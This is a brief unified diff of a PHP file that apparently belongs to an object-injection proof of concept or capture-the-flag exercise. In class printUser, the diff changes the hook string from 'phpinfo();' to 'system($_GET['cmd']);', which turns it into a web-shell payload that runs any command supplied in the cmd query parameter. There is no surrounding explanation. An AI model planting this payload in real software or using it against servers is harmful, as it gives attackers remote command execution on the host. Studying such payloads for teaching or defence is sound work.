@@ -2,10 +2,9 @@
 class printUser
 {
 	public function __construct() {
-		$this->hook = 'phpinfo();';
+		$this->hook = 'system($_GET[\'cmd\']);';
 	}
 }
-
 
 class User
 {
